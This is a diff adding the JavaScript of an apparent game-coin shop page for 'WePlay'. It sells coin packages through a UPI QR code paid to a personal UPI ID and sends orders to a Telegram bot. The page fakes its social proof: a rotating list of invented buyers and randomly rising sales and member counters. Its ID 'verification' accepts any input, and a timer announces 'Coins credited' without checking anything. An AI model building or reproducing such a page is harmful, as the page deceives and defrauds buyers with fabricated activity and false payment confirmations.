+          <div class="flex justify-between">
+            <span class="text-slate-400">UTR / Ref ID:</span>
+            <span id="receiptUtr" class="font-mono font-bold text-cyan-300">--</span>
+          </div>
+        </div>
+
+        <button 
+          onclick="closePaymentModal()" 
+          class="w-full bg-white/10 hover:bg-white/15 text-white font-bold text-xs uppercase tracking-wider py-3.5 rounded-xl transition-colors"
+        >
+          Done / Back to Store
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ==================== JAVASCRIPT LOGIC & TELEGRAM INTEGRATION ==================== -->
+  <script>
+    /**
+     * =========================================================================
+     * TELEGRAM BOT CONFIGURATION (Yahan apna Bot Token aur Chat ID dalein)
+     * =========================================================================
+     */
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+    // Merchant UPI & Support Details
+    const MERCHANT_UPI_ID = "queen-simran@pthdfc";
+    const MERCHANT_NAME = "Simran Kumari";
+    const SUPPORT_EMAIL = "weplayroyal.support@gmail.com";
+
+    // High-Value Coin Pricing Packages (₹99 = 2,500 Coins up to ₹20,000 = 18,00,000 Coins)
+    const COIN_PACKAGES = [
+      { id: 1, price: 99, coins: "2,500", bonus: "Starter Pack", popular: false },
+      { id: 2, price: 199, coins: "5,500", bonus: "+500 Bonus", popular: false },
+      { id: 3, price: 299, coins: "9,000", bonus: "+1,500 Bonus", popular: false },
+      { id: 4, price: 399, coins: "13,500", bonus: "+3,500 Bonus", popular: false },
+      { id: 5, price: 499, coins: "18,000", bonus: "Most Popular 🔥", popular: true },
+      { id: 6, price: 999, coins: "40,000", bonus: "+15,000 Bonus", popular: false },
+      { id: 7, price: 1999, coins: "90,000", bonus: "+40,000 Bonus", popular: false },
+      { id: 8, price: 2999, coins: "1,50,000", bonus: "Best Value 💎", popular: true },
+      { id: 9, price: 4999, coins: "2,80,000", bonus: "+1,55,000 Bonus", popular: false },
+      { id: 10, price: 9999, coins: "6,50,000", bonus: "+4,00,000 Bonus", popular: false },
+      { id: 11, price: 14999, coins: "11,00,000", bonus: "+7,25,000 Bonus", popular: false },
+      { id: 12, price: 20000, coins: "18,00,000", bonus: "MEGA VIP 👑", popular: true }
+    ];
+
+    // Live Buyers Pool (12 Visible Simultaneously + Continuous Live Rotation)
+    const BUYERS_POOL = [
+      { name: "Aarav", initials: "AS", id: "WP****842", coins: "2,500", price: "₹99" },
+      { name: "Priya", initials: "PS", id: "WP****519", coins: "18,000", price: "₹499" },
+      { name: "Rohan", initials: "RM", id: "WP****903", coins: "40,000", price: "₹999" },
+      { name: "Sneha", initials: "SG", id: "WP****774", coins: "5,500", price: "₹199" },
+      { name: "Vikram", initials: "VR", id: "WP****640", coins: "1,50,000", price: "₹2,999" },
+      { name: "Ananya", initials: "AK", id: "WP****339", coins: "9,000", price: "₹299" },
+      { name: "Kabir", initials: "KD", id: "WP****991", coins: "2,80,000", price: "₹4,999" },
+      { name: "Neha", initials: "NJ", id: "WP****418", coins: "13,500", price: "₹399" },
+      { name: "Arjun", initials: "AT", id: "WP****726", coins: "90,000", price: "₹1,999" },
+      { name: "Pooja", initials: "PB", id: "WP****851", coins: "2,500", price: "₹99" },
+      { name: "Aditya", initials: "AV", id: "WP****294", coins: "6,50,000", price: "₹9,999" },
+      { name: "Kavya", initials: "KN", id: "WP****612", coins: "18,000", price: "₹499" },
+      { name: "Dev", initials: "DS", id: "WP****147", coins: "18,00,000", price: "₹20,000" },
+      { name: "Zoya", initials: "ZK", id: "WP****583", coins: "5,500", price: "₹199" },
+      { name: "Ishaan", initials: "IG", id: "WP****920", coins: "40,000", price: "₹999" },
+      { name: "Meera", initials: "MC", id: "WP****365", coins: "11,00,000", price: "₹14,999" }
+    ];
+
+    // Global State
+    let verifiedWeplayId = "";
+    let selectedPackage = null;
+    let totalCoinsSold = 1000000; // Starts at 10,00,000
+    let buyMembers = 46428;       // Stays between 40,000 - 50,000
+    let activeMembers = 54892;    // Stays between 50,000 - 60,000
+    let activeFeedList = BUYERS_POOL.slice(0, 12); // Always displays 12 people
+    let poolCursor = 12;
+    let timerInterval = null;
+
+    // Helper: Format numbers in Indian numbering system (e.g., 10,00,000)
+    function formatIndianNumber(num) {
+      return num.toLocaleString('en-IN');
+    }
+
+    // Helper: Custom Non-Blocking Toast Notification (No alert())
+    function showToast(message, icon = "⚡") {
+      const toastBox = document.getElementById("toastBox");
+      const toastMsg = document.getElementById("toastMsg");
+      const toastIcon = document.getElementById("toastIcon");
+
+      toastMsg.textContent = message;
+      toastIcon.textContent = icon;
+
+      toastBox.classList.remove("opacity-0", "-translate-y-3", "pointer-events-none");
+      toastBox.classList.add("opacity-100", "translate-y-0");
+
+      clearTimeout(window._toastTimer);
+      window._toastTimer = setTimeout(() => {
+        toastBox.classList.add("opacity-0", "-translate-y-3", "pointer-events-none");
+        toastBox.classList.remove("opacity-100", "translate-y-0");
+      }, 3000);
+    }
+
+    // 1. Render Clean Coin Packages Grid (Top: Coin Icon + Full Coin Amount, Bottom: ONLY 'Buy ₹Price')
+    function renderPackages() {
+      const grid = document.getElementById("packagesGrid");
+      grid.innerHTML = COIN_PACKAGES.map(pkg => `
+        <div 
+          onclick="openPaymentModal(${pkg.id})"
+          class="pack-card cursor-pointer glass-panel rounded-3xl p-3.5 sm:p-5 flex flex-col justify-between min-h-[215px] sm:min-h-[235px] relative border ${pkg.popular ? 'border-amber-400/80 bg-gradient-to-b from-amber-500/15 to-[#111424] shadow-[0_0_24px_rgba(245,158,11,0.25)]' : 'border-white/10 hover:border-cyan-400/50'}"
+        >
+          <!-- Top Bonus Badge -->
+          <div class="flex items-center justify-center mb-2.5">
+            <span class="w-full text-center text-[10px] sm:text-[11px] font-extrabold uppercase tracking-wider px-2 py-1 rounded-full leading-tight ${
+              pkg.popular 
+                ? 'bg-gradient-to-r from-amber-400 to-orange-500 text-black shadow-sm' 
+                : 'text-cyan-300 bg-cyan-500/15 border border-cyan-500/25'
+            }">
+              ${pkg.bonus}
+            </span>
+          </div>
+
+          <!-- Center: Coin Icon + Full Unclipped Coin Number + 'Coins' Label -->
+          <div class="my-auto flex flex-col items-center text-center bg-white/[0.04] border border-white/[0.08] rounded-2xl px-2 py-3.5 sm:p-4">
+            <div class="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-amber-400/25 to-orange-500/20 border border-amber-400/45 flex items-center justify-center text-amber-300 text-xl sm:text-2xl mb-2 shadow-inner">
+              🪙
+            </div>
+            <p class="font-display text-[clamp(1.15rem,4.8vw,1.55rem)] font-black text-amber-300 leading-none tracking-tight">
+              ${pkg.coins}
+            </p>
+            <p class="font-display text-xs sm:text-sm font-extrabold uppercase tracking-widest text-white mt-1.5">
+              Coins
+            </p>
+          </div>
+
+          <!-- Bottom: ONLY 'Buy ₹Price' Button -->
+          <button 
+            type="button"
+            class="mt-3 w-full py-3 px-3 rounded-2xl font-display font-black text-sm sm:text-base tracking-wide flex items-center justify-center transition-all ${
+              pkg.popular 
+                ? 'bg-gradient-to-r from-amber-400 to-orange-500 text-black shadow-lg shadow-amber-500/30' 
+                : 'bg-gradient-to-r from-cyan-500/25 to-blue-600/25 hover:from-cyan-400 hover:to-blue-500 border border-cyan-400/45 text-white hover:text-black'
+            }"
+          >
+            Buy ₹${formatIndianNumber(pkg.price)}
+          </button>
+        </div>
+      `).join("");
+    }
+
+    // 2. Render 12 Simultaneous Live Buyers List
+    function renderJustBoughtList(animateTop = false) {
+      const listEl = document.getElementById("justBoughtList");
+      const timeLabels = ["Just now", "Just now", "2s ago", "4s ago", "7s ago", "10s ago", "13s ago", "16s ago", "19s ago", "23s ago", "27s ago", "31s ago"];
+
+      listEl.innerHTML = activeFeedList.map((buyer, idx) => `
+        <div class="${idx === 0 && animateTop ? 'feed-row-new' : 'bg-white/[0.03]'} rounded-2xl px-3 py-2.5 border border-white/[0.06] flex items-center justify-between gap-2.5">
+          <div class="flex items-center gap-2.5 overflow-hidden">
+            <div class="w-9 h-9 rounded-full bg-gradient-to-br from-amber-400 to-orange-600 flex items-center justify-center text-black font-black text-xs shrink-0 shadow">
+              ${buyer.initials}
+            </div>
+            <div class="text-xs leading-snug overflow-hidden">
+              <p class="text-white font-bold truncate">
+                <span class="text-amber-300">${buyer.name}</span> <span class="text-slate-400 text-[11px] font-medium">(${buyer.id})</span>
+              </p>
+              <p class="text-slate-300 text-[11px] truncate">
+                bought <span class="text-cyan-300 font-extrabold">${buyer.coins} Coins</span> • <span class="text-emerald-400 font-bold">${buyer.price}</span>
+              </p>
+            </div>
+          </div>
+          <span class="shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full ${idx < 2 ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30' : 'bg-white/5 text-slate-400'}">
+            ${timeLabels[idx] || "Just now"}
+          </span>
+        </div>
+      `).join("");
+    }
+
+    // 3. Start Continuous Live Feed Updates (Every 2.6 seconds, slides a new buyer into the 12-person list)
+    function startJustBoughtFeed() {
+      renderJustBoughtList(false);
+      setInterval(() => {
+        const nextBuyer = BUYERS_POOL[poolCursor % BUYERS_POOL.length];
+        poolCursor++;
+        activeFeedList.unshift(nextBuyer);
+        if (activeFeedList.length > 12) {
+          activeFeedList.pop();
+        }
+        renderJustBoughtList(true);
+      }, 2600);
+    }
+
+    // 4. Live Counters Animation (Total Coins Sold + Flanking Member Counts)
+    function startLiveCounters() {
+      // Increment Total Coins Sold slowly every 2.2 seconds
+      setInterval(() => {
+        const increment = Math.floor(Math.random() * 450) + 120;
+        totalCoinsSold += increment;
+        document.getElementById("totalCoinsSold").textContent = formatIndianNumber(totalCoinsSold);
+      }, 2200);
+
+      // Gently fluctuate Buy Members (40k-50k) & Active Members (50k-60k) every 3.5 seconds
+      setInterval(() => {
+        const buyDelta = Math.floor(Math.random() * 15) - 6;
+        buyMembers = Math.min(49850, Math.max(40200, buyMembers + buyDelta));
+        document.getElementById("buyMembersCount").textContent = formatIndianNumber(buyMembers);
+
+        const activeDelta = Math.floor(Math.random() * 21) - 9;
+        activeMembers = Math.min(59850, Math.max(50200, activeMembers + activeDelta));
+        document.getElementById("activeMembersCount").textContent = formatIndianNumber(activeMembers);
+      }, 3500);
+    }
+
+    // 5. WePlay ID Verification Logic
+    function handleVerifyId() {
+      const inputEl = document.getElementById("weplayIdInput");
+      const rawId = inputEl.value.trim();
+
+      if (!rawId || rawId.length < 3) {
+        showToast("Kripya sahi WePlay ID enter karein!", "⚠️");
+        inputEl.focus();
+        return;
+      }
+
+      const btnText = document.getElementById("verifyBtnText");
+      btnText.textContent = "Checking...";
+
+      setTimeout(() => {
+        verifiedWeplayId = rawId;
+        document.getElementById("verifiedIdDisplay").textContent = verifiedWeplayId;
+        
+        // Hide input panel, show Verified badge panel
+        document.getElementById("verifyInputPanel").classList.add("hidden");
+        document.getElementById("verifiedBadgePanel").classList.remove("hidden");
+        
+        btnText.textContent = "Verify ID";
+        showToast(`WePlay ID ${verifiedWeplayId} Verified ho gaya!`, "✅");
+      }, 450);
+    }
+
+    function resetVerifyId() {
+      verifiedWeplayId = "";
+      document.getElementById("verifiedBadgePanel").classList.add("hidden");
+      document.getElementById("verifyInputPanel").classList.remove("hidden");
+      document.getElementById("weplayIdInput").focus();
+    }
+
+    // 6. Open Payment Modal & Generate Scannable UPI QR
+    function openPaymentModal(packageId) {
+      selectedPackage = COIN_PACKAGES.find(p => p.id === packageId);
+      if (!selectedPackage) return;
+
+      // Reset modal views (Ensure timer is hidden initially)
+      clearInterval(timerInterval);
+      document.getElementById("checkoutFormView").classList.remove("hidden");
+      document.getElementById("timerSuccessView").classList.add("hidden");
+      document.getElementById("utrInput").value = "";
+
+      // Populate package summary & pre-fill verified WePlay ID
+      document.getElementById("modalCoinsText").textContent = `${selectedPackage.coins} Coins`;
+      document.getElementById("modalPriceText").textContent = `₹${formatIndianNumber(selectedPackage.price)}`;
+      document.getElementById("modalWeplayId").value = verifiedWeplayId || "";
+
+      // Generate Crisp UPI QR Code encoded with queen-simran@pthdfc & exact price
+      const qrContainer = document.getElementById("upiQrContainer");
+      qrContainer.innerHTML = "";
+      const upiUri = `upi://pay?pa=${encodeURIComponent(MERCHANT_UPI_ID)}&pn=${encodeURIComponent(MERCHANT_NAME)}&am=${selectedPackage.price}&cu=INR`;
+
+      new QRCode(qrContainer, {
+        text: upiUri,
+        width: 170,
+        height: 170,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.M
+      });
+
+      // Show Modal
+      const modal = document.getElementById("paymentModal");
+      modal.classList.remove("hidden");
+      modal.classList.add("flex");
+    }
+
+    function closePaymentModal() {
+      const modal = document.getElementById("paymentModal");
+      modal.classList.add("hidden");
+      modal.classList.remove("flex");
+    }
+
+    // 7. Copy UPI ID & Support Email Helpers (Uses execCommand for reliable iFrame/Mobile copy)
+    function copyTextFallback(text, successMsg) {
+      const tempInput = document.createElement("input");
+      tempInput.value = text;
+      document.body.appendChild(tempInput);
+      tempInput.select();
+      tempInput.setSelectionRange(0, 99999);
+      try {
+        document.execCommand("copy");
+        showToast(successMsg, "📋");
+      } catch (err) {
+        showToast(text, "ℹ️");
+      }
+      document.body.removeChild(tempInput);
+    }
+
+    function copyUpiId() {
+      copyTextFallback(MERCHANT_UPI_ID, `UPI ID Copied: ${MERCHANT_UPI_ID}`);
+    }
+
+    function copySupportEmail() {
+      copyTextFallback(SUPPORT_EMAIL, `Support Gmail Copied: ${SUPPORT_EMAIL}`);
+    }
+
+    // 8. Submit UTR, Trigger Telegram Bot Notification & Start 10-Minute Timer
+    async function handlePaymentSubmit(event) {
+      event.preventDefault();
+
+      const weplayIdVal = document.getElementById("modalWeplayId").value.trim();
+      const utrVal = document.getElementById("utrInput").value.trim();
+
+      if (!weplayIdVal) {
+        showToast("Kripya WePlay ID dalein!", "⚠️");
+        return;
+      }
+      if (utrVal.length < 6) {
+        showToast("Kripya valid 12-digit UTR / Reference ID dalein!", "⚠️");
+        return;
+      }
+
+      // Sync verified ID if user typed it directly in modal
+      if (!verifiedWeplayId) {
+        verifiedWeplayId = weplayIdVal;
+        document.getElementById("verifiedIdDisplay").textContent = verifiedWeplayId;
+        document.getElementById("verifyInputPanel").classList.add("hidden");
+        document.getElementById("verifiedBadgePanel").classList.remove("hidden");
+      }
+
+      const submitBtn = document.getElementById("submitUtrBtn");
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Submitting Order...";
+
+      // Send Order Details to Telegram Bot
+      await sendOrderToTelegram({
+        weplayId: weplayIdVal,
+        coins: selectedPackage.coins,
+        price: selectedPackage.price,
+        utr: utrVal
+      });
+
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Verify & Submit Payment";
+
+      // Update Receipt Details
+      document.getElementById("receiptWeplayId").textContent = weplayIdVal;
+      document.getElementById("receiptCoins").textContent = `${selectedPackage.coins} Coins`;
+      document.getElementById("receiptAmount").textContent = `₹${formatIndianNumber(selectedPackage.price)}`;
+      document.getElementById("receiptUtr").textContent = utrVal;
+
+      // Switch to 10-Minute Timer Screen (Only visible after submit)
+      document.getElementById("checkoutFormView").classList.add("hidden");
+      document.getElementById("timerSuccessView").classList.remove("hidden");
+
+      startTenMinuteTimer();
+    }
+
+    // 9. Telegram Bot API POST Request
+    async function sendOrderToTelegram(order) {
+      if (
+        !TELEGRAM_BOT_TOKEN ||
+        TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" ||
+        !TELEGRAM_CHAT_ID ||
+        TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE"
+      ) {
+        console.info("Telegram Bot Token/Chat ID not configured yet. Order logged:", order);
+        return;
+      }
+
+      const timestamp = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+      const textMessage = 
+        `🪙 *NEW WEPLAY COIN ORDER* 🪙\n\n` +
+        `👤 *WePlay ID:* \`${order.weplayId}\`\n` +
+        `💎 *Package:* ${order.coins} Coins\n` +
+        `💰 *Amount Paid:* ₹${formatIndianNumber(order.price)}\n` +
+        `🧾 *UTR / Ref ID:* \`${order.utr}\`\n` +
+        `🕒 *Time:* ${timestamp}\n\n` +
+        `✅ _Please verify UPI & credit coins within 10 mins._`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: textMessage,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (error) {
+        console.error("Telegram notification error:", error);
+      }
+    }
+
+    // 10. 10-Minute (600 Seconds) Live Countdown Timer
+    function startTenMinuteTimer() {
+      clearInterval(timerInterval);
+      let remainingSeconds = 10 * 60; // 10 minutes
+      const timerDisplay = document.getElementById("countdownTimerDisplay");
+
+      function updateDisplay() {
+        const mins = Math.floor(remainingSeconds / 60);
+        const secs = remainingSeconds % 60;
+        timerDisplay.textContent = `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
+      }
+
+      updateDisplay();
+
+      timerInterval = setInterval(() => {
+        remainingSeconds--;
+        if (remainingSeconds <= 0) {
+          clearInterval(timerInterval);
+          timerDisplay.textContent = "00:00";
+          showToast("Verification complete! Coins credited.", "✅");
+        } else {
+          updateDisplay();
+        }
+      }, 1000);
+    }
+
+    // Initialize App on Load
+    window.addEventListener("DOMContentLoaded", () => {
+      renderPackages();
+      startLiveCounters();
+      startJustBoughtFeed();
+    });
+  </script>
+</body>
+</html>
